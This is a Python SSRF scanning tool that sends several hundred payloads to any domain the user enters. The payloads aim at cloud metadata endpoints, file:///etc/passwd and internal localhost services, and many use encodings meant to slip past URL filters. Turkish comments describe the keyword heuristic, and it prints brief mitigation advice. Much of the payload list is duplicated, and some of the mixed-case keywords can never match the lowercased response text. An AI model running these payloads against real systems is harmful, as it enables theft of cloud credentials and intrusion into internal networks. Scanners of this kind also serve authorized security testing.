import requests # type: ignore
import logging
import base64

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class SSRFScanner:
    def __init__(self, target_url_template, payloads, methods, session=None):
        self.target_url_template = target_url_template
        self.payloads = payloads
        self.methods = methods
        self.session = session if session else requests.Session()
        self.vulnerabilities = []

    def scan(self):
        for payload in self.payloads:
            for method in self.methods:
                url = self.target_url_template.format(payload)
                try:
                    response = self.send_request(method, url)
                    if self.is_vulnerable(response):
                        self.log_vulnerability(method, url, payload, response.status_code, response.text[:200])
                except requests.RequestException as e:
                    logging.error(f"Error with {method} request to {url}: {e}")

    def send_request(self, method, url):
        if method == 'GET':
            return self.session.get(url, timeout=5)
        elif method == 'POST':
            return self.session.post(url, data={'url': url}, timeout=5)
        elif method == 'PUT':
            return self.session.put(url, data={'url': url}, timeout=5)
        else:
            logging.error(f"Unsupported HTTP method: {method}")
            return requests.Response()  # Return an empty response for unsupported methods

    def is_vulnerable(self, response):
        # Simple heuristic to detect potential SSRF vulnerabilities
        return response.status_code == 200 and any(keyword in response.text.lower() for keyword in ['root:', 'meta-data', 'admin', '127.0.0.1', 'private', 'internal', 'server', 'AWS', 'Sensitive', 'Access', 'Confidential', 'Token', 'Credentials', 'IP Address', 'Localhost', 'Network', 'Secret', 'Key', 'Configuration'])
        
#Metadata: SSRF saldırıları genellikle hedef sistemdeki metadata veya sunucu bilgilerini çekmek için kullanılır. Bu nedenle "metadata" kelimesi SSRF zafiyeti ararken dikkate alınmalıdır.

#Private: SSRF ile hedef sistemin özel veya hassas bilgilerini hedeflemek mümkündür. Bu nedenle "private" kelimesi de bir şüpheli anahtar kelime olabilir.

#Internal: SSRF saldırıları genellikle iç ağdaki veya iç sistemlerdeki bilgilere erişim sağlamak için kullanılır. Bu nedenle "internal" kelimesi de aranabilir.

#Server: SSRF saldırıları genellikle hedef sunucu üzerindeki zafiyetleri hedefler. "Server" kelimesi SSRF zafiyeti ararken dikkate alınabilir.

#AWS: Eğer hedef sistem AWS (Amazon Web Services) gibi bir bulut sağlayıcı kullanıyorsa, SSRF saldırıları genellikle bu tür bulut servislerine erişim sağlamak için kullanılır. Bu nedenle "AWS" kelimesi de dikkate alınabilir.

#Sensitive: Hassas veya gizli bilgileri ifade etmek için kullanılan "sensitive" kelimesi, SSRF saldırıları sırasında hedef sistemin içerisindeki hassas verilere erişimi hedeflemek için kullanılabilir.

#Access: "Access" kelimesi, SSRF saldırıları sırasında erişim sağlanan hedef kaynakları veya hedef sistemin içerisindeki erişim izinlerini ifade edebilir.

#Confidential: Gizli bilgileri veya verileri ifade etmek için kullanılan "confidential" kelimesi, SSRF saldırıları sırasında hedef sistemin içerisindeki gizli bilgilere erişim sağlanması durumunda kullanılabilir.

#Token: SSRF saldırıları genellikle yetkilendirme mekanizmalarını hedefler. "Token" kelimesi, bu tür yetkilendirme anahtarlarını veya token'ları ifade edebilir.

#Credentials: "Credentials" kelimesi, SSRF saldırıları sırasında hedef sistemin kullanıcı kimlik bilgilerine veya yetkilendirme bilgilerine erişim sağlanması durumunda kullanılabilir.

#Configuration: SSRF saldırıları bazen hedef sistemin yapılandırma dosyalarına erişmek için kullanılabilir. "Configuration" kelimesi, bu tür yapılandırma bilgilerini ifade edebilir.

#IP Address: SSRF saldırıları genellikle hedef sistemin IP adreslerine erişim sağlamayı amaçlar. Bu nedenle "IP address" veya "IP" gibi ifadeler içeren içeriklere dikkat edilebilir.

#Localhost: SSRF saldırıları sırasında yerel makineye veya hedef sistemin içerisindeki yerel kaynaklara erişim sağlanması hedeflenir. "Localhost" kelimesi bu tür durumları ifade edebilir.

#Network: "Network" kelimesi, hedef sistemin içerisindeki ağ yapılarını veya ağa erişimi ifade edebilir. SSRF saldırıları sırasında genellikle ağa erişim sağlanmaya çalışılır.

#Metadata: Bir hedef sistemdeki meta verileri veya sistem bilgilerini ifade eden "metadata" kelimesi, SSRF saldırıları sırasında hedef sistemin yapılandırma bilgilerine veya sistem bilgilerine erişim sağlamak için kullanılabilir.

#Secret: Gizli veya hassas bilgileri ifade eden "secret" kelimesi, SSRF saldırıları sırasında hedef sistemdeki gizli verilere erişim sağlamayı amaçlayabilir.

#Key: Yetkilendirme anahtarlarını ifade eden "key" kelimesi, SSRF saldırıları sırasında yetkilendirme mekanizmalarını hedefleyebilir.
        

    def log_vulnerability(self, method, url, payload, status, content):
        vulnerability_info = (
            f"Vulnerability Found!\n"
            f"Method: {method}\n"
            f"URL: {url}\n"
            f"Payload: {payload}\n"
            f"Status: {status}\n"
            f"Content: {content}\n"
            f"Why Vulnerable: The response indicates access to sensitive internal resources or metadata, suggesting that the server processes the URL in an unsafe manner.\n"
            f"Mitigation: Validate and sanitize all user inputs, restrict outbound network traffic, use allow-lists for URLs, and implement network segmentation and firewall rules.\n"
            f"{'-'*60}\n"
        )
        print(vulnerability_info)
        self.vulnerabilities.append((method, url, payload, status, content))

if __name__ == "__main__":
    def base64_encode(url):
        return base64.b64encode(url.encode()).decode()

    # Get the target domain from the user
    target_domain = input("Enter the domain to scan for SSRF vulnerabilities (e.g., example.com): ")
    target_url_template = f"http://{target_domain}?url={{}}"

    payloads = [
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://0.0.0.0:80",
        "http://169.254.169.254/computeMetadata/v1/",
        "file:///etc/passwd",
        "http://[::1]",
        "http://[::]:80",
        "http://2130706433",  # http://127.0.0.1 in decimal
        "http://0x7f000001",  # http://127.0.0.1 in hexadecimal
        "http://017700000001",  # http://127.0.0.1 in octal
        "http://127.1",
        "http://127.0.1",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1/admin",
        "http://localhost:8000",
        "http://localhost:3000",
        "http://localhost:5000",
        "http://localhost/admin",
        "http://127.0.0.1/x",
        "http://127.0.0.1/login",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1/healthz",
        "http://127.0.0.1/status",
        "http://localhost:8500/v1/catalog/nodes",
        "http://localhost:8080/api/v1/nodes",
        "http://localhost:8080/api/v1/pods",
        "http://localhost:8000/debug/pprof",
        "http://localhost:8000/metrics",
        "http://localhost:5000/info",
        "http://localhost:8888/stats",
        "http://localhost:15672/api/overview",
        "http://localhost:6379",
        "http://localhost:11211",
        "http://localhost:9200/_cluster/health",
        "http://localhost:9200/_nodes/stats",
        "http://localhost:9200/_cat/indices",
        "http://localhost:5984/_all_dbs",
        "http://localhost:27017",
        "http://localhost:3306",
        "http://localhost:5432",
        "http://localhost:3000/api/datasources",
        "http://localhost:8086/query?q=SHOW+DATABASES",
        "http://localhost:4040/api/tunnels",
        "http://localhost:4040/status",
        "http://localhost:8081/artifactory/api/system/ping",
        "http://127.0.0.1#@localhost",
        "http://127.0.0.1:80@localhost",
        "http://127.0.0.1/%2e%2e",
        "http://127.0.0.1/%09",
        "http://127.0.0.1/%0d%0a",
        "http://127.0.0.1/%2e%2e/%2e%2e",
        "http://169.254.169.254.xip.io/latest/meta-data/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://localhost.nip.io",
        "http://localhost.xip.io",
        "http://127.0.0.1.xip.io",
        "http://127.0.0.1.nip.io",
        "http://00000000127",
        "http://00000000127:80",
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",
        "http://127.000.000.001",
        "http://127.1.1.1",
        "http://127.0.0.1:80%0d%0a",
        "http://169.254.169.254:80%0d%0a",
        "http://[::]:80%0d%0a",
        "http://[::1]:80%0d%0a",
        "http://127.0.0.1%23%40",
        "http://127.0.0.1%40example.com",
        "http://127.0.0.1%09",
        "http://127.0.0.1%23@",
        "http://169.254.169.254:80@",
        "http://[::1]:80@",
        "http://localhost@127.0.0.1",
        "data:text/plain;base64," + base64_encode("http://127.0.0.1"),
        "data:text/plain;base64," + base64_encode("http://169.254.169.254/latest/meta-data/"),
        "data:text/plain;base64," + base64_encode("http://localhost:8080/api/v1/nodes"),
        "data:text/plain;base64," + base64_encode("file:///etc/passwd"),
        "http://127.0.0.1%252e%252e",
        "http://169.254.169.254/latest/meta-data/..;/latest/meta-data/",
        "http://127.0.0.1%2f%2e%2e%2f",
        "http://127.0.0.1%25%30%30",
        "http://localhost%20admin",
        "http://127.0.0.1/?@localhost",
        "http://127.0.0.1/.%2e",
        "http://127.0.0.1/.%2e/././",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://0.0.0.0:80",
        "http://169.254.169.254/computeMetadata/v1/",
        "file:///etc/passwd",
        "http://[::1]",
        "http://[::]:80",
        "http://2130706433",  # http://127.0.0.1 in decimal
        "http://0x7f000001",  # http://127.0.0.1 in hexadecimal
        "http://017700000001",  # http://127.0.0.1 in octal
        "http://127.1",
        "http://127.0.1",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1/admin",
        "http://localhost:8000",
        "http://localhost:3000",
        "http://localhost:5000",
        "http://localhost/admin",
        "http://127.0.0.1/x",
        "http://127.0.0.1/login",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1/healthz",
        "http://127.0.0.1/status",
        "http://localhost:8500/v1/catalog/nodes",
        "http://localhost:8080/api/v1/nodes",
        "http://localhost:8080/api/v1/pods",
        "http://localhost:8000/debug/pprof",
        "http://localhost:8000/metrics",
        "http://localhost:5000/info",
        "http://localhost:8888/stats",
        "http://localhost:15672/api/overview",
        "http://localhost:6379",
        "http://localhost:11211",
        "http://localhost:9200/_cluster/health",
        "http://localhost:9200/_nodes/stats",
        "http://localhost:9200/_cat/indices",
        "http://localhost:5984/_all_dbs",
        "http://localhost:27017",
        "http://localhost:3306",
        "http://localhost:5432",
        "http://localhost:3000/api/datasources",
        "http://localhost:8086/query?q=SHOW+DATABASES",
        "http://localhost:4040/api/tunnels",
        "http://localhost:4040/status",
        "http://localhost:8081/artifactory/api/system/ping",
        "http://127.0.0.1#@localhost",
        "http://127.0.0.1:80@localhost",
        "http://127.0.0.1/%2e%2e",
        "http://127.0.0.1/%09",
        "http://127.0.0.1/%0d%0a",
        "http://127.0.0.1/%2e%2e/%2e%2e",
        "http://169.254.169.254.xip.io/latest/meta-data/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://localhost.nip.io",
        "http://localhost.xip.io",
        "http://127.0.0.1.xip.io",
        "http://127.0.0.1.nip.io",
        "http://00000000127",
        "http://00000000127:80",
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",
        "http://127.000.000.001",
        "http://127.1.1.1",
        "http://127.0.0.1:80%0d%0a",
        "http://169.254.169.254:80%0d%0a",
        "http://[::]:80%0d%0a",
        "http://[::1]:80%0d%0a",
        "http://127.0.0.1%23%40",
        "http://127.0.0.1%40example.com",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://0.0.0.0:80",
        "http://169.254.169.254/computeMetadata/v1/",
        "file:///etc/passwd",
        "http://[::1]",
        "http://[::]:80",
        "http://2130706433",  # http://127.0.0.1 in decimal
        "http://0x7f000001",  # http://127.0.0.1 in hexadecimal
        "http://017700000001",  # http://127.0.0.1 in octal
        "http://127.1",
        "http://127.0.1",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1/admin",
        "http://localhost:8000",
        "http://localhost:3000",
        "http://localhost:5000",
        "http://localhost/admin",
        "http://127.0.0.1/x",
        "http://127.0.0.1/login",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1/healthz",
        "http://127.0.0.1/status",
        "http://localhost:8500/v1/catalog/nodes",
        "http://localhost:8080/api/v1/nodes",
        "http://localhost:8080/api/v1/pods",
        "http://localhost:8000/debug/pprof",
        "http://localhost:8000/metrics",
        "http://localhost:5000/info",
        "http://localhost:8888/stats",
        "http://localhost:15672/api/overview",
        "http://localhost:6379",
        "http://localhost:11211",
        "http://localhost:9200/_cluster/health",
        "http://localhost:9200/_nodes/stats",
        "http://localhost:9200/_cat/indices",
        "http://localhost:5984/_all_dbs",
        "http://localhost:27017",
        "http://localhost:3306",
        "http://localhost:5432",
        "http://localhost:3000/api/datasources",
        "http://localhost:8086/query?q=SHOW+DATABASES",
        "http://localhost:4040/api/tunnels",
        "http://localhost:4040/status",
        "http://localhost:8081/artifactory/api/system/ping",
        "http://127.0.0.1#@localhost",
        "http://127.0.0.1:80@localhost",
        "http://127.0.0.1/%2e%2e",
        "http://127.0.0.1/%09",
        "http://127.0.0.1/%0d%0a",
        "http://127.0.0.1/%2e%2e/%2e%2e",
        "http://169.254.169.254.xip.io/latest/meta-data/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://localhost.nip.io",
        "http://localhost.xip.io",
        "http://127.0.0.1.xip.io",
        "http://127.0.0.1.nip.io",
        "http://00000000127",
        "http://00000000127:80",
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",
        "http://127.000.000.001",
        "http://127.1.1.1",
        "http://127.0.0.1:80%0d%0a",
        "http://169.254.169.254:80%0d%0a",
        "http://[::]:80%0d%0a",
        "http://[::1]:80%0d%0a",
        "http://127.0.0.1%23%40",
        "http://127.0.0.1%40example.com",
        "http://127.0.0.1%09",
        "http://127.0.0.1%23@",
        "http://169.254.169.254:80@",
        "http://[::1]:80@",
        "http://localhost@127.0.0.1",
        "data:text/plain;base64," + base64_encode("http://127.0.0.1"),
        "data:text/plain;base64," + base64_encode("http://169.254.169.254/latest/meta-data/"),
        "data:text/plain;base64," + base64_encode("http://localhost:8080/api/v1/nodes"),
        "data:text/plain;base64," + base64_encode("file:///etc/passwd"),
        "http://127.0.0.1%252e%252e",
        "http://169.254.169.254/latest/meta-data/..;/latest/meta-data/",
        "http://127.0.0.1%2f%2e%2e%2f",
        "http://127.0.0.1%25%30%30",
        "http://localhost%20admin",
        "http://127.0.0.1/?@localhost",
        "http://127.0.0.1/.%2e",
        "http://127.0.0.1/.%2e/././",
        "http://127.0.0.1%09",
        "http://127.0.0.1%23@",
        "http://169.254.169.254:80@",
        "http://[::1]:80@",
        "http://localhost@127.0.0.1",
        "data:text/plain;base64," + base64_encode("http://127.0.0.1"),
        "data:text/plain;base64," + base64_encode("http://169.254.169.254/latest/meta-data/"),
        "data:text/plain;base64," + base64_encode("http://localhost:8080/api/v1/nodes"),
        "data:text/plain;base64," + base64_encode("file:///etc/passwd"),
        "http://127.0.0.1%252e%252e",
        "http://169.254.169.254/latest/meta-data/..;/latest/meta-data/",
        "http://127.0.0.1%2f%2e%2e%2f",
        "http://127.0.0.1%25%30%30",
        "http://localhost%20admin",
        "http://127.0.0.1/?@localhost",
        "http://127.0.0.1/.%2e",
        "http://127.0.0.1/.%2e/././",
        "http://169.254.169.254/latest/meta-data/..;/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/%2e%2e%2f",
        "http://169.254.169.254/latest/meta-data/%2e%2e/",
        "http://169.254.169.254/latest/meta-data/%3f",
        "http://169.254.169.254/latest/meta-data/%25",
        "http://169.254.169.254/latest/meta-data/%26",
        "http://169.254.169.254/latest/meta-data/%23",
        "http://169.254.169.254/latest/meta-data/%2b",
        "http://169.254.169.254/latest/meta-data/%21",
        "http://169.254.169.254/latest/meta-data/%24",
        "http://169.254.169.254/latest/meta-data/%27",
        "http://169.254.169.254/latest/meta-data/%28",
        "http://169.254.169.254/latest/meta-data/%29",
        "http://169.254.169.254/latest/meta-data/%2a",
        "http://169.254.169.254/latest/meta-data/%2c",
        "http://169.254.169.254/latest/meta-data/%3b",
        "http://169.254.169.254/latest/meta-data/%3d",
        "http://169.254.169.254/latest/meta-data/%3e",
        "http://169.254.169.254/latest/meta-data/%3c",
        "http://169.254.169.254/latest/meta-data/%5b",
        "http://169.254.169.254/latest/meta-data/%5d",
        "http://169.254.169.254/latest/meta-data/%5e",
        "http://169.254.169.254/latest/meta-data/%60",
        "http://169.254.169.254/latest/meta-data/%7b",
        "http://169.254.169.254/latest/meta-data/%7d",
        "http://169.254.169.254/latest/meta-data/%7c",
        "http://169.254.169.254/latest/meta-data/%7e",
        "http://169.254.169.254/latest/meta-data/%7f",
        "http://169.254.169.254/latest/meta-data/%80",
        "http://169.254.169.254/latest/meta-data/%81",
        "http://169.254.169.254/latest/meta-data/%82",
        "http://169.254.169.254/latest/meta-data/%83",
        "http://169.254.169.254/latest/meta-data/%84",
        "http://169.254.169.254/latest/meta-data/%85",
        "http://169.254.169.254/latest/meta-data/%86",
        "http://169.254.169.254/latest/meta-data/%87",
        "http://169.254.169.254/latest/meta-data/%88",
        "http://169.254.169.254/latest/meta-data/%89",
        "http://169.254.169.254/latest/meta-data/%8a",
        "http://169.254.169.254/latest/meta-data/%8b",
        "http://169.254.169.254/latest/meta-data/%8c",
        "http://169.254.169.254/latest/meta-data/%8d",
        "http://169.254.169.254/latest/meta-data/%8e",
        "http://169.254.169.254/latest/meta-data/%8f",
        "http://169.254.169.254/latest/meta-data/%90",
        "http://169.254.169.254/latest/meta-data/%91",
        "http://169.254.169.254/latest/meta-data/%92",
        "http://169.254.169.254/latest/meta-data/%93",
        "http://169.254.169.254/latest/meta-data/%94",
        "http://169.254.169.254/latest/meta-data/%95",
        "http://169.254.169.254/latest/meta-data/%96",
        "http://169.254.169.254/latest/meta-data/%97",
        "http://169.254.169.254/latest/meta-data/%98",
        "http://169.254.169.254/latest/meta-data/%99",
        "http://169.254.169.254/latest/meta-data/%9a",
        "http://169.254.169.254/latest/meta-data/%9b",
        "http://169.254.169.254/latest/meta-data/%9c",
        "http://169.254.169.254/latest/meta-data/%9d",
        "http://169.254.169.254/latest/meta-data/%9e",
        "http://169.254.169.254/latest/meta-data/%9f",
        "http://169.254.169.254/latest/meta-data/%a0",
        "http://169.254.169.254/latest/meta-data/%a1",
        "http://169.254.169.254/latest/meta-data/%a2",
        "http://169.254.169.254/latest/meta-data/%a3",
        "http://169.254.169.254/latest/meta-data/%a4",
        "http://169.254.169.254/latest/meta-data/%a5",
        "http://169.254.169.254/latest/meta-data/%a6",
        "http://169.254.169.254/latest/meta-data/%a7",
        "http://169.254.169.254/latest/meta-data/%a8",
        "http://169.254.169.254/latest/meta-data/%a9",
        "http://169.254.169.254/latest/meta-data/%aa",
        "http://169.254.169.254/latest/meta-data/%ab",
        "http://169.254.169.254/latest/meta-data/%ac",
        "http://169.254.169.254/latest/meta-data/%ad",
        "http://169.254.169.254/latest/meta-data/%ae",
        "http://169.254.169.254/latest/meta-data/%af",
        "http://169.254.169.254/latest/meta-data/%b0",
        "http://169.254.169.254/latest/meta-data/%b1",
        "http://169.254.169.254/latest/meta-data/%b2",
        "http://169.254.169.254/latest/meta-data/%b3",
        "http://169.254.169.254/latest/meta-data/%b4",
        "http://169.254.169.254/latest/meta-data/%b5",
        "http://169.254.169.254/latest/meta-data/%b6",
        "http://169.254.169.254/latest/meta-data/%b7",
        "http://169.254.169.254/latest/meta-data/%b8",
        "http://169.254.169.254/latest/meta-data/%b9",
        "http://169.254.169.254/latest/meta-data/%ba",
        "http://169.254.169.254/latest/meta-data/%bb",
        "http://169.254.169.254/latest/meta-data/%bc",
        "http://169.254.169.254/latest/meta-data/%bd",
        "http://169.254.169.254/latest/meta-data/%be",
        "http://169.254.169.254/latest/meta-data/%bf",
        "http://169.254.169.254/latest/meta-data/%c0",
        "http://169.254.169.254/latest/meta-data/%c1",
        "http://169.254.169.254/latest/meta-data/%c2",
        "http://169.254.169.254/latest/meta-data/%c3",
        "http://169.254.169.254/latest/meta-data/%c4",
        "http://169.254.169.254/latest/meta-data/%c5",
        "http://169.254.169.254/latest/meta-data/%c6",
        "http://169.254.169.254/latest/meta-data/%c7",
        "http://169.254.169.254/latest/meta-data/%c8",
        "http://169.254.169.254/latest/meta-data/%c9",
        "http://169.254.169.254/latest/meta-data/%ca",
        "http://169.254.169.254/latest/meta-data/%cb",
        "http://169.254.169.254/latest/meta-data/%cc",
        "http://169.254.169.254/latest/meta-data/%cd",
        "http://169.254.169.254/latest/meta-data/%ce",
        "http://169.254.169.254/latest/meta-data/%cf",
        "http://169.254.169.254/latest/meta-data/%d0",
        "http://169.254.169.254/latest/meta-data/%d1",
        "http://169.254.169.254/latest/meta-data/%d2",
        "http://169.254.169.254/latest/meta-data/%d3",
        "http://169.254.169.254/latest/meta-data/%d4",
        "http://169.254.169.254/latest/meta-data/%d5",
        "http://169.254.169.254/latest/meta-data/%d6",
        "http://169.254.169.254/latest/meta-data/%d7",
        "http://169.254.169.254/latest/meta-data/%d8",
        "http://169.254.169.254/latest/meta-data/%d9",
        "http://169.254.169.254/latest/meta-data/%da",
        "http://169.254.169.254/latest/meta-data/%db",
        "http://169.254.169.254/latest/meta-data/%dc",
        "http://169.254.169.254/latest/meta-data/%dd",
        "http://169.254.169.254/latest/meta-data/%de",
        "http://169.254.169.254/latest/meta-data/%df",
        "http://169.254.169.254/latest/meta-data/%e0",
        "http://169.254.169.254/latest/meta-data/%e1",
        "http://169.254.169.254/latest/meta-data/%e2",
        "http://169.254.169.254/latest/meta-data/%e3",
        "http://169.254.169.254/latest/meta-data/%e4",
        "http://169.254.169.254/latest/meta-data/%e5",
        "http://169.254.169.254/latest/meta-data/%e6",
        "http://169.254.169.254/latest/meta-data/%e7",
        "http://169.254.169.254/latest/meta-data/%e8",
        "http://169.254.169.254/latest/meta-data/%e9",
        "http://169.254.169.254/latest/meta-data/%ea",
        "http://169.254.169.254/latest/meta-data/%eb",
        "http://169.254.169.254/latest/meta-data/%ec",
        "http://169.254.169.254/latest/meta-data/%ed",
        "http://169.254.169.254/latest/meta-data/%ee",
        "http://169.254.169.254/latest/meta-data/%ef",
        "http://169.254.169.254/latest/meta-data/%f0",
        "http://169.254.169.254/latest/meta-data/%f1",
        "http://169.254.169.254/latest/meta-data/%f2",
        "http://169.254.169.254/latest/meta-data/%f3",
        "http://169.254.169.254/latest/meta-data/%f4",
        "http://169.254.169.254/latest/meta-data/%f5",
        "http://169.254.169.254/latest/meta-data/%f6",
        "http://169.254.169.254/latest/meta-data/%f7",
        "http://169.254.169.254/latest/meta-data/%f8",
        "http://169.254.169.254/latest/meta-data/%f9",
        "http://169.254.169.254/latest/meta-data/%fa",
        "http://169.254.169.254/latest/meta-data/%fb",
        "http://169.254.169.254/latest/meta-data/%fc",
        "http://169.254.169.254/latest/meta-data/%fd",
        "http://169.254.169.254/latest/meta-data/%fe",
        "http://169.254.169.254/latest/meta-data/%ff",
    ]

    methods = ['GET', 'POST', 'PUT']

    scanner = SSRFScanner(target_url_template, payloads, methods)
    scanner.scan()
